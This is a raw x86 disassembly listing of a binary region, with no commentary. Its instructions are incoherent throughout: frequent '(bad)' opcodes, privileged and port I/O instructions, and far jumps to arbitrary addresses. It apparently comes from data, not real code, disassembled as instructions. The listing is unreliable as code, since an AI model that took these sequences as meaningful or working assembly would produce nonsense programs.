  411d15:	and    eax,0x7ff0ada3
  411d1a:	mov    bh,0x2b
  411d1c:	pop    es
  411d1d:	mov    ebp,0x7e9ec873
  411d22:	retf   0xb0af
  411d25:	pushf  
  411d26:	mov    ecx,0x237ceb48
  411d2b:	fwait
  411d2c:	xchg   edx,eax
  411d2d:	xchg   esp,eax
  411d2e:	mov    dl,BYTE PTR [edi+ebx*1-0x1e]
  411d32:	pop    ds
  411d33:	and    DWORD PTR [esi+0x948858d],edx
  411d39:	icebp  
  411d3a:	ds out dx,eax
  411d3c:	jmp    0x411cff
  411d3e:	sub    al,0x1b
  411d40:	inc    eax
  411d41:	mov    bl,0x58
  411d43:	sub    ch,cl
  411d45:	fmul   QWORD PTR [esi+0x5231804e]
  411d4b:	in     eax,dx
  411d4c:	jecxz  0x411d4f
  411d4e:	pop    esp
  411d4f:	enter  0xb1ba,0xf9
  411d53:	adc    ch,dh
  411d55:	mov    ds:0xe023bfb8,al
  411d5a:	xchg   esi,eax
  411d5b:	mov    BYTE PTR [eax+0x4b1729bb],cl
  411d61:	dec    ebx
  411d62:	xchg   ecx,eax
  411d63:	in     al,0xeb
  411d65:	xchg   ebp,eax
  411d66:	pop    ebp
  411d67:	cmp    eax,0x9d33312d
  411d6c:	push   ds
  411d6d:	fild   WORD PTR [esi+0x237910de]
  411d73:	fs inc esp
  411d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d76:	cs stc 
  411d78:	jmp    0x411d56
  411d7a:	je     0x411d4d
  411d7c:	loop   0x411de4
  411d7e:	inc    ebp
  411d7f:	inc    esi
  411d80:	outs   dx,BYTE PTR ds:[esi]
  411d81:	iret   
  411d82:	mov    ecx,0xdad592c8
  411d87:	xchg   ecx,eax
  411d88:	daa    
  411d89:	and    BYTE PTR [edx],0x90
  411d8c:	jmp    0x411d60
  411d8e:	or     eax,0xa415c9a0
  411d93:	push   0xc894c661
  411d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d99:	loopne 0x411d20
  411d9b:	dec    ebx
  411d9c:	xor    DWORD PTR [ebp+0x10eb937c],0x6d05bbb
  411da6:	scas   eax,DWORD PTR es:[edi]
  411da7:	pop    ds
  411da8:	dec    ecx
  411da9:	(bad)  
  411daa:	sbb    al,0xc8
  411dac:	repz inc ecx
  411dae:	or     al,0xf2
  411db0:	push   es
  411db1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411db2:	jl     0x411dca
  411db4:	out    dx,al
  411db5:	iret   
  411db6:	dec    ebx
  411db7:	cld    
  411db8:	cmp    eax,0x995c2bff
  411dbd:	push   esi
  411dbe:	adc    al,cl
  411dc0:	leave  
  411dc1:	leave  
  411dc2:	ds add bl,dl
  411dc5:	dec    edx
  411dc6:	and    al,0x57
  411dc8:	jmp    0x411d7f
  411dca:	nop
  411dcb:	or     BYTE PTR [ebp+0x19],0xc6
  411dcf:	fs push cs
  411dd1:	fistp  QWORD PTR [edx+eiz*1-0x41]
  411dd5:	cmp    DWORD PTR [esp+edx*2],esi
  411dd8:	sbb    dh,al
  411dda:	cld    
  411ddb:	or     al,0xd8
  411ddd:	jmp    0xc7dc:0xf4da29eb
  411de4:	push   ds
  411de5:	icebp  
  411de6:	jle    0x411dc4
  411de8:	test   DWORD PTR [bp+si+0x6d],0xabfd589e
  411df0:	pop    eax
  411df1:	stc    
  411df2:	daa    
  411df3:	test   edi,ebp
  411df5:	mov    ch,0x74
  411df7:	enter  0x3328,0x82
  411dfb:	push   0x1b
  411dfd:	pop    edi
  411dfe:	stc    
  411dff:	arpl   bx,bp
  411e01:	add    BYTE PTR [ebx-0x63],dh
  411e04:	mov    ds:0xe212aafd,al
  411e09:	fdivp  st(7),st
  411e0b:	mov    ah,0x2c
  411e0d:	test   DWORD PTR [eax+eiz*4-0x422cd83b],edx
  411e14:	jmp    0x411de8
  411e16:	or     ecx,DWORD PTR [eax+0x554d4ff3]
  411e1c:	test   al,0x35
  411e1e:	adc    eax,0x377a12c9
  411e23:	popw   ds
  411e25:	test   eax,0x1c422891
  411e2a:	std    
  411e2b:	jl     0x411e0c
  411e2d:	cdq    
  411e2e:	adc    cl,BYTE PTR [ebp-0x66dc53ef]
  411e34:	or     ebx,edi
  411e36:	addr16 and al,0x4d
  411e39:	add    al,0x56
  411e3b:	pop    esp
  411e3c:	mov    cl,0xf3
  411e3e:	cld    
  411e3f:	push   edi
  411e40:	inc    esp
  411e41:	shl    BYTE PTR [edx+0x37],0x34
  411e45:	dec    ebx
  411e46:	cld    
  411e47:	(bad)  
  411e48:	pusha  
  411e49:	xor    DWORD PTR [esi],ecx
  411e4b:	fild   WORD PTR [ebp+0xaa520a]
  411e51:	pandn  mm3,mm1
  411e54:	or     eax,0x73c7e78a
  411e59:	lods   al,BYTE PTR fs:[esi]
  411e5b:	xchg   ebp,eax
  411e5c:	jb     0x411e71
  411e5e:	cmp    eax,ecx
  411e60:	fnstsw WORD PTR [edi+0x423e65b0]
  411e66:	scas   al,BYTE PTR es:[edi]
  411e67:	loopne 0x411e51
  411e69:	gs mov dl,0x73
  411e6c:	mov    ecx,0xc1277d5f
  411e71:	aam    0x50
  411e73:	enter  0xb79e,0xd5
  411e77:	test   eax,0xf1d54dcf
  411e7c:	pop    ss
  411e7d:	jne    0x411e7c
  411e7f:	out    0xa8,eax
  411e81:	mov    cl,0xb6
  411e83:	shl    DWORD PTR [ebx+0x44],0x8e
  411e87:	popf   
  411e88:	in     eax,0xd9
  411e8a:	icebp  
  411e8b:	xchg   edi,esp
  411e8d:	inc    edx
  411e8e:	jge    0x411eed
  411e90:	into   
  411e91:	es in  al,dx
  411e93:	xor    ebp,ebx
  411e95:	rol    WORD PTR [edi-0x4c],1
  411e99:	lods   eax,DWORD PTR ds:[esi]
  411e9a:	push   edx
  411e9b:	test   eax,0xc022779f
  411ea0:	xchg   ebx,eax
  411ea1:	jbe    0x411e6d
  411ea3:	or     ch,BYTE PTR [edx]
  411ea5:	cmp    ebp,edi
  411ea7:	test   ebx,eax
  411ea9:	in     eax,0x9a
  411eab:	data16 mov ds:0x2c09b1,al
  411eb1:	loopne 0x411ea7
  411eb3:	jmp    0x781d9def
  411eb8:	cld    
  411eb9:	daa    
  411eba:	std    
  411ebb:	dec    edx
  411ebc:	jmp    0xf2d47ccd
  411ec1:	mov    bh,0x2a
  411ec3:	sub    BYTE PTR [ecx],bl
  411ec5:	fnstsw ax
  411ec7:	mov    WORD PTR [eax],?
  411ec9:	add    dh,al
  411ecb:	mov    WORD PTR [esi+esi*8+0x544d6ffc],ds
  411ed2:	nop
  411ed3:	imul   esp,DWORD PTR [eax-0x5a],0xb4e5c576
  411eda:	cmp    al,BYTE PTR [ebx]
  411edc:	loope  0x411efd
  411ede:	push   0x6a
  411ee0:	icebp  
  411ee1:	mov    ds:0xe65215fc,eax
  411ee6:	xchg   esp,eax
  411ee7:	fadd   DWORD PTR [ebp-0x58]
  411eea:	sbb    BYTE PTR [edx],ah
  411eec:	jp     0x411ecd
  411eee:	push   0xe4409d7c
  411ef3:	xor    BYTE PTR [eax],0xaa
  411ef6:	cld    
  411ef7:	(bad)  
  411ef9:	xor    al,0xf0
  411efb:	stos   BYTE PTR es:[edi],al
  411efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411efd:	sbb    eax,0xacc1c86d
  411f02:	cli    
  411f03:	or     eax,0x667857e7
  411f08:	jmp    0x411f37
  411f0a:	adc    bh,BYTE PTR [esi-0x46deb10b]
  411f10:	pop    es
  411f11:	(bad)  
  411f13:	mov    eax,ds:0x2537e580
  411f18:	into   
  411f19:	mov    al,ds:0x2b520dfc
  411f1e:	psubsb mm5,QWORD PTR [ebx]
  411f21:	fs or  al,cl
  411f24:	add    ebx,DWORD PTR [esi+esi*1-0x2a589a5f]
  411f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f2c:	jmp    0x411eeb
  411f2e:	push   ebx
  411f2f:	mov    ?,WORD PTR [eax-0x4f748f46]
  411f35:	fcomip st,st(0)
  411f37:	in     eax,0x41
  411f39:	mov    bl,0xd
  411f3b:	cs daa 
  411f3d:	loopne 0x411f31
  411f3f:	mov    ecx,0x687eb913
  411f44:	adc    BYTE PTR [ebx-0x1d],al
  411f47:	popf   
  411f48:	push   ebx
  411f49:	fstp   DWORD PTR [ebp-0x7]
  411f4c:	inc    edx
  411f4d:	rcl    DWORD PTR ds:0xa63e6b9f,cl
  411f53:	inc    ebp
  411f54:	sar    BYTE PTR [eax-0x13278204],cl
  411f5a:	xor    al,0xb6
  411f5c:	jbe    0x411f20
  411f5e:	add    cl,al
  411f60:	inc    eax
  411f61:	aaa    
  411f62:	sub    eax,0x86be4eef
  411f67:	ins    DWORD PTR es:[edi],dx
  411f68:	in     al,dx
  411f69:	push   ecx
  411f6a:	add    BYTE PTR [edi-0x7d8c1d64],al
  411f70:	mov    edx,ebp
  411f72:	fadd   st(7),st
  411f74:	repz test BYTE PTR ds:[eax-0x58],0x3f
  411f7a:	in     eax,dx
  411f7b:	popf   
  411f7c:	jmp    0x411f2d
  411f7e:	out    0x80,eax
  411f80:	mov    ds:0xe754a8ec,al
  411f85:	fist   WORD PTR [ecx-0x29b17e11]
  411f8b:	push   esi
  411f8c:	rcl    DWORD PTR cs:[si],cl
  411f90:	clc    
  411f91:	call   0xeb7a692
  411f96:	sub    DWORD PTR [edx-0x6dd820a8],esi
  411f9c:	out    0xb1,al
  411f9e:	xchg   DWORD PTR [eax-0x5102ebf1],eax
  411fa4:	sbb    eax,0x66
  411fa7:	pop    ss
  411fa8:	std    
  411fa9:	cmp    al,0x61
  411fab:	enter  0xcb80,0xe2
  411faf:	clc    
  411fb0:	jns    0x411ffd
  411fb2:	or     bh,BYTE PTR [eax-0x4fd1f515]
  411fb8:	and    BYTE PTR [eax-0x279cee4f],dh
  411fbe:	call   0x8b35:0x9340cfe6
  411fc5:	add    al,0x4e
  411fc7:	mov    edi,0x91fd8edf
  411fcc:	pop    ebx
  411fcd:	jl     0x411f56
  411fcf:	push   ebp
  411fd0:	repnz sub eax,0x8a15c873
  411fd6:	ret    0xe787
  411fd9:	sub    al,0xdd
  411fdb:	ja     0x411fe8
  411fdd:	cli    
  411fde:	cld    
  411fdf:	adc    DWORD PTR [edi-0x66],ecx
  411fe2:	out    0x66,al
  411fe4:	imul   DWORD PTR [ebx-0x586d3789]
  411fea:	lea    ecx,[ecx-0x38]
  411fed:	mov    ecx,0xe8ee6407
  411ff2:	retf   0xb3f
  411ff5:	inc    eax
  411ff6:	pop    ebx
  411ff7:	xchg   edx,eax
  411ff8:	inc    esi
  411ff9:	add    al,0x9c
  411ffb:	pushf  
  411ffc:	sub    ecx,DWORD PTR [eax]
  411ffe:	jae    0x41206c
  412000:	push   ebp
  412001:	push   ebx
  412002:	hlt    
  412003:	(bad)  
  412004:	cwde   
  412005:	lea    edi,ds:0xc579a1ac
  41200b:	call   0x3edd:0x53cd30ea
  412012:	fist   WORD PTR [edi+0x4c]
  412015:	repnz mov bl,0x2e
  412018:	jecxz  0x412005
  41201a:	xchg   edi,eax
  41201b:	inc    esi
  41201c:	stc    
  41201d:	pop    edi
  41201e:	push   ds
  41201f:	and    edx,DWORD PTR [esp+esi*8-0x6a157cab]
  412026:	js     0x41207a
  412028:	xchg   DWORD PTR [edi-0x5c],ebx
  41202b:	jo     0x41206f
  41202d:	add    edi,DWORD PTR [esi-0x71]
  412030:	shl    DWORD PTR [edi+0x6],1
  412033:	enter  0x8c59,0x6e
  412037:	arpl   WORD PTR ss:[edx],si
  41203a:	das    
  41203b:	mov    bh,0x9b
  41203d:	aaa    
  41203e:	hlt    
  41203f:	enter  0x9269,0x24
  412043:	mov    ds:0xe59a3ba6,eax
  412048:	loope  0x4120ab
  41204a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41204b:	dec    eax
  41204c:	push   ss
  41204d:	sbb    BYTE PTR [esi+ebp*1+0x74],bh
  412051:	sbb    DWORD PTR [eax],edx
  412053:	inc    eax
  412054:	outs   dx,DWORD PTR ds:[esi]
  412055:	(bad)  
  412057:	or     DWORD PTR [eax],esi
  412059:	pop    esi
  41205a:	and    al,0x68
  41205c:	aaa    
  41205d:	xor    ebx,DWORD PTR [esp+ebp*4]
  412060:	jmp    0x41202f
  412062:	push   esi
  412063:	rcl    BYTE PTR [edx+0x5083c2bc],0xdf
  41206a:	dec    eax
  41206b:	push   ds
  41206c:	sbb    bl,BYTE PTR [ecx-0x7e5f27ec]
  412072:	std    
  412073:	sbb    DWORD PTR [ebp+0x4f22cf44],esi
  412079:	xchg   ebp,eax
  41207a:	jge    0x412044
  41207c:	call   0xa988:0xc6d2cf3
  412083:	push   ebp
  412084:	jmp    0x4120fa
  412086:	hlt    
  412087:	and    BYTE PTR [edi+0x30],bh
  41208a:	xor    esi,ebx
  41208c:	stos   DWORD PTR es:[edi],eax
  41208d:	fild   QWORD PTR [ebx+0x34]
  412090:	in     eax,dx
  412091:	pop    ds
  412092:	dec    ebp
  412093:	xchg   edi,eax
  412094:	inc    ebx
  412095:	sbb    al,0xfd
  412097:	ret    
  412098:	xchg   edx,eax
  412099:	pop    esi
  41209a:	or     DWORD PTR [edi],edx
  41209c:	enter  0x324a,0xc8
  4120a0:	pop    ebx
  4120a1:	mov    al,ds:0x22d431ef
  4120a6:	xchg   ebx,eax
  4120a7:	aaa    
  4120a8:	popf   
  4120a9:	hlt    
  4120aa:	cld    
  4120ab:	test   BYTE PTR ds:0xb851fad2,ah
  4120b1:	dec    ebp
  4120b2:	pop    es
  4120b3:	nop
  4120b4:	pop    ebp
  4120b5:	ret    0xf8fc
  4120b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120b9:	mov    edi,DWORD PTR [edx-0x32b8c91]
  4120bf:	or     edi,DWORD PTR ss:0x7abbc5a3
  4120c6:	xchg   esp,eax
  4120c7:	enter  0x9d82,0x6d
  4120cb:	and    edi,DWORD PTR [edi]
  4120cd:	or     edx,DWORD PTR [edi]
  4120cf:	mov    ebx,0x6bf2f415
  4120d4:	sar    esp,0x23
  4120d7:	dec    eax
  4120d8:	sbb    cl,BYTE PTR ds:0xdffd0d14
  4120de:	imul   eax,DWORD PTR [esi*2-0x7475052b],0x2d
  4120e6:	std    
  4120e7:	clc    
  4120e8:	jp     0x4120dd
  4120ea:	xor    DWORD PTR [ebp+0x5c],esi
  4120ed:	pop    edi
  4120ee:	or     al,0xf4
  4120f1:	lahf   
  4120f2:	stos   DWORD PTR es:[edi],eax
  4120f3:	add    ch,cl
  4120f5:	ss push esp
  4120f7:	pop    es
  4120f8:	jecxz  0x41209f
  4120fa:	dec    ebp
  4120fb:	enter  0x7db1,0x3
  4120ff:	dec    edx
  412100:	sub    BYTE PTR [esi-0x6e],bl
  412103:	enter  0x63f9,0x36
  412107:	add    ebx,ebp
  412109:	aam    0xa3
  41210b:	mov    fs,esp
  41210d:	xchg   BYTE PTR [esi],bh
  41210f:	(bad)  
  412110:	or     DWORD PTR [ecx-0x32d41024],esp
  412116:	(bad)  
  412118:	cs (bad) 
  41211b:	cmc    
  41211c:	test   DWORD PTR [eax-0x6a],eax
  41211f:	adc    DWORD PTR [eax-0x5ae3b4ba],ebp
  412125:	inc    esp
  412126:	popf   
  412127:	pop    es
  412128:	out    dx,al
  412129:	mov    al,0x23
  41212b:	sub    esp,ebp
  41212d:	aas    
  41212e:	outs   dx,BYTE PTR ds:[esi]
  41212f:	in     al,0x8f
  412131:	inc    ecx
  412132:	xor    al,0xc9
  412134:	mov    bh,0x6d
  412136:	mov    bl,0xea
  412138:	dec    DWORD PTR [esi+0x46]
  41213b:	and    BYTE PTR [eax-0x1423cfde],bh
  412141:	add    ch,BYTE PTR [ecx+0x30]
  412144:	out    0x76,eax
  412146:	sbb    BYTE PTR [ecx-0x3a],0xdf
  41214a:	dec    BYTE PTR [edi+ecx*4]
  41214d:	ins    BYTE PTR es:[edi],dx
  41214e:	rcl    BYTE PTR [edx+esi*1+0x47],cl
  412152:	add    ecx,esp
  412154:	lock iret 
  412156:	cld    
  412157:	inc    esp
  412158:	test   BYTE PTR [ebp-0x201a3e28],dl
  41215e:	mov    eax,0x42b4d027
  412163:	or     BYTE PTR [eax-0x6c],0xf9
  412167:	sbb    eax,0xb974bddc
  41216c:	sub    ebp,DWORD PTR [edx+ecx*1]
  41216f:	shl    BYTE PTR [edi+eax*1],1
  412172:	cld    
  412173:	in     al,0xeb
  412175:	ss push ebx
  412177:	sar    BYTE PTR ds:0xebe42f94,cl
  41217d:	fwait
  41217e:	xor    ebx,ecx
  412180:	je     0x41218d
  412182:	inc    ebx
  412183:	pop    ds
  412184:	jmp    0xcfec:0xfdcfbbdc
  41218b:	fbld   TBYTE PTR [ebx]
  41218d:	xchg   DWORD PTR ds:0xefc2ee04,ebp
  412193:	push   ebx
  412194:	pop    ss
  412195:	cmp    BYTE PTR [eax-0x6e88a78],bl
  41219b:	int    0x1e
  41219d:	fisttp WORD PTR [edx+ecx*1]
  4121a0:	les    edx,FWORD PTR [edi-0x80]
  4121a3:	fdiv   DWORD PTR [ebx+0x679bfcad]
  4121a9:	push   ebx
  4121aa:	cld    
  4121ab:	xor    cl,BYTE PTR gs:[ecx+ecx*8-0x38]
  4121b0:	jbe    0x412150
  4121b2:	sub    bh,bl
  4121b4:	cwde   
  4121b5:	or     BYTE PTR [edx],bh
  4121b7:	push   0xbf1ceb00
  4121bc:	sub    eax,DWORD PTR [ebx-0x36]
  4121bf:	jle    0x4121f7
  4121c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121c2:	or     al,0x29
  4121c5:	sti    
  4121c6:	cmp    ecx,esi
  4121c8:	leave  
  4121c9:	jne    0x41214f
  4121cb:	xchg   esi,eax
  4121cc:	add    ch,ah
  4121ce:	and    ah,al
  4121d0:	jmp    0x4121e1
  4121d2:	cld    
  4121d3:	arpl   WORD PTR [ebx],bx
  4121d5:	stos   BYTE PTR es:[edi],al
  4121d6:	ins    DWORD PTR es:[edi],dx
  4121d7:	mov    ebp,0x885566d8
  4121dc:	fnsave [ebx+0x5aadfd5d]
  4121e2:	std    
  4121e3:	inc    edi
  4121e4:	xor    al,0x7c
  4121e6:	inc    ecx
  4121e7:	mov    bh,0x4f
  4121e9:	jmp    0x412265
  4121eb:	into   
  4121ec:	(bad)  
  4121ee:	or     DWORD PTR [ebp+0x2b],ebp
  4121f1:	mov    ecx,0x522ffd56
  4121f6:	std    
  4121f7:	push   edx
  4121f8:	repz inc edi
  4121fa:	jmp    0x4121a4
  4121fc:	dec    ebp
  4121fd:	addr16 sbb ebx,ecx
  412200:	inc    edi
  412201:	sahf   
  412202:	stos   BYTE PTR es:[edi],al
  412203:	int3   
  412204:	sbb    ebx,DWORD PTR [edi-0xfa8fd5c]
  41220a:	cld    
  41220b:	je     0x41224d
  41220d:	pop    eax
  41220e:	fld    QWORD PTR [ecx+edx*8]
  412211:	out    0x31,eax
  412213:	enter  0xf2e8,0x93
  412217:	dec    ecx
  412218:	xor    ah,bh
  41221a:	fidivr WORD PTR [esi]
  41221c:	jmp    0xcccf:0x9020f5dc
  412223:	push   0xcb3aa9be
  412228:	inc    ebp
  412229:	aaa    
  41222a:	test   DWORD PTR [ecx+0x8a1136d],esi
  412230:	or     esp,DWORD PTR [ebp+0x60]
  412233:	dec    ebp
  412234:	jmp    0x4121d4
  412236:	or     bl,BYTE PTR [ebx+0x57]
  412239:	mov    DWORD PTR [ebp+0x50df7c1d],ecx
  41223f:	xchg   ebp,eax
  412240:	dec    eax
  412241:	mov    esp,0x77ad86c7
  412246:	in     al,0x98
  412248:	(bad)  
  41224a:	ror    DWORD PTR [edx-0x3545fd19],1
  412250:	push   0xffffffdf
  412252:	mov    ebx,0x2a888711
  412257:	mov    esp,0x9e004b88
  41225c:	mov    bh,0x24
  41225e:	mov    eax,0xd157852a
  412263:	aam    0xf3
  412265:	fild   WORD PTR [edi+0x7ec44728]
  41226b:	loop   0x412298
  41226d:	lock std 
  41226f:	xchg   edi,eax
  412270:	shl    DWORD PTR [eax-0x32],1
  412273:	lds    esp,FWORD PTR [eax-0x3a81631b]
  412279:	fisubr WORD PTR [edi+ebx*2-0x5be48ac7]
  412280:	xchg   edi,eax
  412281:	sub    ecx,DWORD PTR [eax-0x44ed1428]
  412287:	cld    
  412288:	retf   0x78ef
  41228b:	or     eax,0x843cdf5f
  412290:	mov    fs,eax
  412292:	jnp    0x412231
  412294:	push   es
  412295:	idiv   ah
  412297:	xchg   ebx,eax
  412298:	(bad)  
  412299:	mov    esi,0xad45d9aa
  41229e:	xlat   BYTE PTR ds:[ebx]
  41229f:	(bad)  
  4122a0:	pop    ds
  4122a1:	idiv   ebp
  4122a3:	aaa    
  4122a4:	cmp    edx,DWORD PTR [eax+0xa]
  4122a7:	and    esi,0x343e7e8e
  4122ad:	retf   0xddec
  4122b0:	ret    
  4122b1:	mov    ebp,0x1e84c889
  4122b6:	and    al,0x8b
  4122b8:	xchg   BYTE PTR [edx],ch
  4122ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122bb:	shl    BYTE PTR [ebx+0x69],0xfd
  4122bf:	dec    edx
  4122c0:	xor    esp,esi
  4122c2:	dec    ebp
  4122c3:	call   0xfc3b:0xc8d058af
  4122ca:	fs (bad) 
  4122cc:	icebp  
  4122cd:	or     eax,0x34eb4d7a
  4122d2:	dec    ebp
  4122d3:	test   al,0x30
  4122d5:	icebp  
  4122d6:	test   DWORD PTR [eax-0x37adaed3],esi
  4122dc:	and    ebp,eax
  4122de:	into   
  4122df:	or     al,0xd8
  4122e1:	addr16 imul eax,ecx,0xffffffe6
  4122e5:	xor    BYTE PTR [eax-0x61d0cf60],bh
  4122eb:	jmp    0xdfb0:0x33c8fea1
  4122f2:	sub    BYTE PTR [edx+ebx*4+0x23],0xb4
  4122f7:	(bad)  
  4122f8:	popf   
  4122f9:	jmp    0x763fee9c
  4122fe:	js     0x412374
  412300:	jle    0x412378
  412302:	std    
  412303:	out    0xa6,al
  412305:	xchg   ebx,eax
  412306:	clc    
  412307:	sub    ebp,DWORD PTR [eax-0x21]
  41230a:	mov    fs,edx
  41230c:	jnp    0x41232d
  41230e:	dec    esi
  41230f:	addr16 cld 
  412311:	push   ss
  412312:	std    
  412313:	fnstsw WORD PTR [edx+0x1d]
  412316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412317:	jb     0x412396
  412319:	imul   ecx,esi,0xffffffc8
  41231c:	clc    
  41231d:	push   eax
  41231e:	ins    DWORD PTR es:[edi],dx
  41231f:	lock sub eax,esp
  412322:	(bad)  
  412323:	sbb    al,0xfe
  412325:	and    bl,BYTE PTR [ecx+esi*8+0x6c]
  412329:	inc    esp
  41232a:	sbb    ch,bl
  41232c:	sti    
  41232d:	in     ax,dx
  41232f:	pop    eax
  412330:	mov    eax,ds:0x562dd7dc
  412335:	pop    edx
  412336:	add    al,0x8c
  412338:	inc    ebx
  412339:	adc    dl,BYTE PTR [edx]
  41233b:	je     0x412331
  41233d:	xchg   ebx,eax
  41233e:	mov    bl,0x15
  412340:	mov    ds:0x5ce17cb2,eax
  412345:	mov    dh,0x8
  412347:	pop    esp
  412348:	std    
  412349:	and    edx,esi
  41234b:	call   0x8a31:0x9fb290ab
  412352:	xchg   edi,eax
  412353:	mov    al,ds:0x198edf36
  412358:	shr    eax,cl
  41235a:	dec    edx
  41235b:	push   esp
  41235c:	(bad)  
  41235d:	jge    0x41235f
  41235f:	dec    ecx
  412360:	mov    dl,0x6a
  412362:	push   edi
  412363:	pop    esi
  412364:	xchg   edx,eax
  412365:	sbb    DWORD PTR [ebx-0x2ebd920],esp
  41236b:	dec    ebx
  41236c:	push   es
  41236d:	(bad)  
  41236e:	sbb    dl,ah
  412370:	in     al,0xa0
  412372:	jmp    edx
  412374:	outs   dx,BYTE PTR ds:[esi]
  412375:	xor    ebp,DWORD PTR [ecx]
  412377:	add    DWORD PTR [ebp-0x64434292],ebx
  41237d:	add    al,0x2e
  41237f:	mov    ebp,0x89b68bea
  412384:	dec    ebx
  412385:	dec    ebp
  412386:	(bad)  
  412387:	pop    edi
  412388:	gs mov edi,0xc5e4ec80
  41238e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41238f:	dec    eax
  412390:	mov    esi,gs
  412392:	pop    esi
  412393:	ret    
  412394:	jne    0x4123a4
  412396:	xor    ch,bl
  412398:	xchg   DWORD PTR [esi-0x5ebaf982],ebp
  41239e:	jg     0x4123ec
  4123a0:	imul   eax,DWORD PTR [edx+0x7d],0xffffff9e
  4123a4:	mov    esi,0xcc0af41e
  4123a9:	sar    BYTE PTR [esi+0x8],1
  4123ac:	rcr    ebx,0xee
  4123af:	and    esi,DWORD PTR [ecx-0x21]
  4123b2:	fs jno 0x412386
  4123b5:	cmp    BYTE PTR [edx],bh
  4123b7:	mov    al,ds:0xd5fd8c6a
  4123bc:	jne    0x412425
  4123be:	pop    ebx
  4123bf:	call   0x24ba:0xc8e8627f
  4123c6:	jmp    0xaa15b923
  4123cb:	mov    BYTE PTR ds:0xe21f99ab,bh
  4123d1:	cwde   
  4123d2:	or     BYTE PTR [edi+0x24],0x4c
  4123d6:	shr    eax,0x10
  4123d9:	mov    al,0x39
  4123db:	dec    edx
  4123dc:	push   esp
  4123dd:	fcomip st,st(2)
  4123df:	out    dx,eax
  4123e0:	xchg   ebp,eax
  4123e1:	sahf   
  4123e2:	fcomp  QWORD PTR [ebx+0x65fcd64d]
  4123e8:	sub    eax,DWORD PTR [ebp-0x2386a8d4]
  4123ee:	mov    ebp,0xe3eb4be0
  4123f3:	lods   eax,DWORD PTR ds:[esi]
  4123f4:	imul   ebx,DWORD PTR [edx+ebx*8],0xffffffdd
  4123f8:	loopne 0x4123ed
  4123fa:	mov    cl,0xf
  4123fc:	ret    
  4123fd:	mov    BYTE PTR [ecx],0xe3
  412400:	jl     0x4123e1
  412402:	sub    BYTE PTR [ecx+0x26],dh
  412405:	repnz sahf 
  412407:	aad    0x5b
  412409:	fsub   DWORD PTR [ecx-0x630bf472]
  41240f:	add    ebp,edi
  412411:	xor    ebx,DWORD PTR [edx]
  412413:	mov    al,0xeb
  412415:	or     edi,ebp
  412417:	jp     0x412415
  412419:	loopne 0x4123da
  41241b:	cmc    
  41241c:	jno    0x4123fd
  41241e:	mov    BYTE PTR [ecx],bl
  412420:	adc    BYTE PTR [esi+0x546008ea],0xfd
  412427:	popf   
  412428:	retf   
  412429:	or     eax,0x40d4fc2f
  41242e:	push   esi
  41242f:	enter  0xa98f,0x46
  412433:	cmc    
  412434:	xchg   esi,eax
  412435:	pop    es
  412436:	mov    ds:0xe8fdff95,al
  41243b:	(bad)  
  41243c:	mov    ch,0x60
  41243e:	pop    eax
  41243f:	enter  0x7dd8,0xc7
  412443:	xor    edi,edi
  412445:	jp     0x412444
  412447:	add    BYTE PTR [eax+0x2f87a550],cl
  41244d:	neg    BYTE PTR [ebx]
  41244f:	retf   
  412450:	dec    esp
  412451:	mov    ch,0x1d
  412453:	xlat   BYTE PTR ds:[ebx]
  412454:	mov    esp,0xc6ada551
  412459:	stos   BYTE PTR es:[edi],al
  41245a:	cld    
  41245b:	xor    bh,ah
  41245d:	jmp    0x41241f
  41245f:	mov    ds:0xdc2c771a,eax
  412464:	in     al,0xc9
  412466:	cld    
  412467:	and    eax,0x2dffb3c1
  41246c:	ja     0x4124a8
  41246e:	(bad)  
  41246f:	pop    ds
  412470:	xor    BYTE PTR [ebx],dl
  412472:	jne    0x412490
  412474:	dec    eax
  412475:	fwait
  412476:	mov    eax,0xb6dffc0e
  41247b:	loopne 0x41246c
  41247d:	cli    
  41247e:	add    BYTE PTR [ebx+0x19fcc66c],0x73
  412485:	lods   eax,DWORD PTR ds:[esi]
  412486:	ja     0x41245e
  412488:	add    al,0x6c
  41248a:	dec    ebp
  41248b:	loopne 0x41240e
  41248d:	pop    ds
  41248e:	(bad)  
  41248f:	aas    
  412490:	push   edx
  412491:	(bad)  
  412492:	ror    cl,1
  412494:	ja     0x4124c5
  412496:	push   ebx
  412497:	mov    edx,0x9a3e7dc3
  41249c:	lds    ecx,FWORD PTR [ebp-0x32140709]
  4124a2:	fldenv [ecx-0x37bf311f]
  4124a8:	fisub  DWORD PTR [eax*1-0x2d54fb85]
  4124af:	div    DWORD PTR [edx]
  4124b1:	pop    edi
  4124b2:	test   al,0x49
  4124b4:	mov    bh,cl
  4124b6:	rol    BYTE PTR [ecx],0x37
  4124b9:	test   al,0x3d
  4124bb:	mov    edi,0x48b0a6d8
  4124c0:	push   0x79923b68
  4124c5:	mov    ebp,0xca6a6ffc
  4124ca:	test   al,0x23
  4124cc:	scas   al,BYTE PTR es:[edi]
  4124cd:	xchg   ebx,eax
  4124ce:	adc    DWORD PTR [ebp+0x47cadf13],ebx
  4124d4:	add    BYTE PTR [edx+0x31],cl
  4124d7:	mov    cl,0x1c
  4124d9:	ret    
  4124da:	add    ecx,DWORD PTR [edx-0x414304f2]
  4124e0:	stos   BYTE PTR es:[edi],al
  4124e1:	(bad)  [esi*4-0x56bd20bc]
  4124e8:	add    esp,DWORD PTR [edi-0x18]
  4124eb:	(bad)  
  4124ed:	jne    0x41248e
  4124ef:	iret   
  4124f0:	pop    ebx
  4124f1:	jno    0x4124f3
  4124f3:	adc    BYTE PTR [ebx+0x19],0x53
  4124f7:	xchg   cl,ah
  4124f9:	(bad)  
  4124fa:	mov    dh,0x64
  4124fc:	inc    esi
  4124fd:	(bad)  
  4124ff:	mov    ah,0xac
  412501:	js     0x4124d5
  412503:	push   ds
  412504:	and    DWORD PTR [edx],esp
  412506:	std    
  412507:	mov    al,ds:0x34117ce6
  41250c:	jnp    0x412547
